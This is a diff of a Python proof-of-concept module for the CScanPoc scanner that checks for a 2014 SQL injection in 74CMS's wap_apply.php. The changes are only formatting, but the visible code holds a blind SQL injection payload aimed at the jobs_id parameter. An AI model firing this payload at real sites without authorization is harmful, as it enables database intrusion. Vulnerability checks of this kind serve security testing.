@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = '74CMS_0012_L' # 平台漏洞编号，留空
+    vuln_id = '74CMS_0012_L'  # 平台漏洞编号，留空
     name = '骑士CMS SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-11-13'  # 漏洞公布时间
     desc = '''
         漏洞文件:\wap\personal\wap_apply.php
@@ -33,8 +34,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #先注册个用户
+
+            # 先注册个用户
             payload = '/upload/wap/personal/wap_apply.php?act=apply_add'
             data = "resume_id=1&jobs_id=23 and if(ascii(substr(md5(c),1,1))=113,1,null)%23"
             url = self.target + payload
@@ -49,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
